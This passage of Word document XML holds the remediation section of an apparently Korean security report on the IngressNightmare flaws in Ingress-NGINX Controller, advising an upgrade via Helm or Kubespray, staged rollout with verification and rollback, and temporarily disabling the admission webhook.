          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BAC749" w14:textId="1861F04B" w:rsidR="00484D84" w:rsidRPr="00484D84" w:rsidRDefault="00484D84" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00484D84">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">7.1 </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Ingress-NGINX Controller v1.11.5, v1.12.1 </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이상으로</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>업그레이드</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>권고</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7422747F" w14:textId="56EB6A3B" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">가장 효과적이고 권장되는 대응책은 Ingress-NGINX Controller를 최신 패치 버전(v1.11.5 또는 v1.12.1)으로 즉시 업그레이드하는 것입니다. 이 패치에는 CVE-2025-24514를 비롯한 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>IngressNightmare</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 시리즈의 모든 주요 취약점에 대한 보안 수정이 포함되어 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DC2452" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>업그레이드 방법 예시</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288971D6" w14:textId="717C7B76" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="90"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Helm 사용 시</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F995F1E" wp14:editId="71D3E230">
                <wp:extent cx="4029740" cy="1254642"/>
                <wp:effectExtent l="0" t="0" r="27940" b="22225"/>
                <wp:docPr id="200260177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740" cy="1254642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15C6D" w14:textId="7AC6ADE4" w:rsidR="001B086D" w:rsidRPr="001D6E9D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
                            <w:pPr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Helm</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6A2390F2" w14:textId="14423AC6" w:rsidR="001B086D" w:rsidRPr="00CF2767" w:rsidRDefault="001B086D" w:rsidP="001B086D">
                            <w:pPr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</w:pPr>
                            <w:r w:rsidRPr="001B086D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helm upgrade ingress-nginx ingress-nginx/ingress-nginx \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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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 xml:space="preserve">  --version </w:t>
                            </w:r>
                            <w:r w:rsidRPr="001B086D">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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.</w:t>
                            </w:r>
                            <w:r w:rsidRPr="001B086D">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>12</w:t>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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>.1 \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br/>
                            </w:r>
                            <w:r w:rsidRPr="001B086D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  <w:t xml:space="preserve">  -n ingress-nginx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995F1E" id="_x0000_s1041" style="width:317.3pt;height:9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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="18615C6D" w14:textId="7AC6ADE4" w:rsidR="001B086D" w:rsidRPr="001D6E9D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
                      <w:pPr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Helm</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6A2390F2" w14:textId="14423AC6" w:rsidR="001B086D" w:rsidRPr="00CF2767" w:rsidRDefault="001B086D" w:rsidP="001B086D">
                      <w:pPr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</w:pPr>
                      <w:r w:rsidRPr="001B086D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helm upgrade ingress-nginx ingress-nginx/ingress-nginx \</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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 xml:space="preserve">  --version </w:t>
                      </w:r>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>1</w:t>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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.</w:t>
                      </w:r>
                      <w:r w:rsidRPr="001B086D">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>12</w:t>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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>.1 \</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:r w:rsidRPr="001B086D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  <w:t xml:space="preserve">  -n ingress-nginx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E0BC4A" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="90"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Kubespray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 등 자동화 도구 사용 시</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A442A5" w14:textId="092AD20D" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="90"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">최신 버전의 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Kubespray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>를 사용하여 배포 스크립트의 Ingress-NGINX 버전을 1.12.1로 지정</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589D6CA9" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>업그레이드 단계별 검증</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5E7C7E" w14:textId="4B45C263" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사전 점검</w:t>
      </w:r>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 기존 Ingress 리소스의 호환성, 커스텀 설정, HPA(자동 확장) 등 확인</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05DAB33C" w14:textId="695028B4" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>점진적 배포</w:t>
      </w:r>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 새 버전 Pod를 일부 트래픽에 할당하여 정상 동작 확인 후 전체 롤링 업데이트 진행</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321AC6E3" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>업데이트 후 검증</w:t>
      </w:r>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="484CADE2" w14:textId="195F00B3" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>kubectl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> describe ingress &lt;이름&gt; 명령으로 이벤트 및 적용 여부 확인</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B79284" w14:textId="77777777" w:rsidR="001B086D" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="001B086D">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서비스 정상 동작 및 로그 이상 여부 점검.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A977B44" w14:textId="312BCF42" w:rsidR="00484D84" w:rsidRPr="001B086D" w:rsidRDefault="001B086D" w:rsidP="00484D84">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="91"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Rollback</w:t>
      </w:r>
      <w:r w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: 문제 발생 시 즉시 이전 버전으로 롤백 가능</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70608E75" w14:textId="2541263F" w:rsidR="00484D84" w:rsidRPr="00484D84" w:rsidRDefault="00484D84" w:rsidP="00484D84">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00484D84">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">7.2 </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>임시</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대응</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">: Admission Controller </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>비활성화</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>네트워크</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>접근</w:t>
      </w:r>
      <w:r w:rsidR="001B086D" w:rsidRPr="001B086D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1B086D" w:rsidRPr="001B086D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>제한</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340AA458" w14:textId="77777777" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller 비활성화</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174F8DA0" w14:textId="7D15C87B" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치 적용이 즉시 어렵다면, 임시로 Admission Controller(Validating Admission Webhook)를 비활성화하여 위험을 낮출 수 있습니다. 단, 이 기능은 Ingress 리소스의 유효성 검증을 담당하므로, 패치 후 반드시 재활성화해야 합니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F8FBCE" w14:textId="2776D47B" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="92"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Helm 설치 환경</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
